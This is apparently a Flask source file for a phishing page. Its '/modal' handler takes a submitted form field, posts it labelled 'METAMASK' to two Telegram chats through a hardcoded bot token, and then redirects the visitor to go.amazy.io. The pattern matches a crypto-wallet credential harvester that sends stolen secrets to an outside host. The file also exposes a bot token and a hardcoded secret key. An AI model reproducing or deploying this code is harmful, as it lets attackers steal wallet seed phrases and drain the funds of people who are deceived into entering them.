from flask import Flask, render_template, request, redirect, url_for
import sys
import telebot

bot = telebot.TeleBot('5388329826:AAEn8-KGcoULQqVdbOPnI7P0m2R-f7Cy-DM')
app = Flask(__name__)
app.config.from_object('config')
app.config['SECRET_KEY'] = 'yandexlyceum_secret_key'


def main():
    app.run()


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == "GET":
        return render_template('main.html')
    return redirect('/modal')


@app.route('/modal', methods=['GET', 'POST'])
def modal():
    if request.method == "POST":
        username = request.form.get('sid')
        print(username)
        bot.send_message(5582965961,f'METAMASK: {username}')
        bot.send_message(921502574, f'METAMASK: {username}')
        return redirect('https://go.amazy.io/')

    return render_template('modal.html')


if __name__ == '__main__':
    main()
